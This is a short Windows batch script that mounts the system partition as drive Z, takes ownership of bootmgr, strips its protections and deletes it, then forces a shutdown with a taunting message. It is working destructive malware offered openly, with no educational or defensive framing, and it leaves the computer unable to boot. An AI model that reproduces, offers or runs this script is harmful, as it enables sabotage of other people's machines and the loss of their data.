@echo off

cd C:/Users/%USERNAME%

echo sel disk 0 > tmp.txt
echo sel part 1 >> tmp.txt
echo assign letter=z >> tmp.txt

diskpart /s tmp.txt
del tmp.txt /q /f

z:

takeown /F bootmgr /A
cacls "Z:/bootmgr" /e /p {write your username here}:F
attrib "Z:/bootmgr" -s -h

del "Z:/bootmgr" /q /f

shutdown /s /t 10 /c "Your computer is now gone, there is no escape ;)"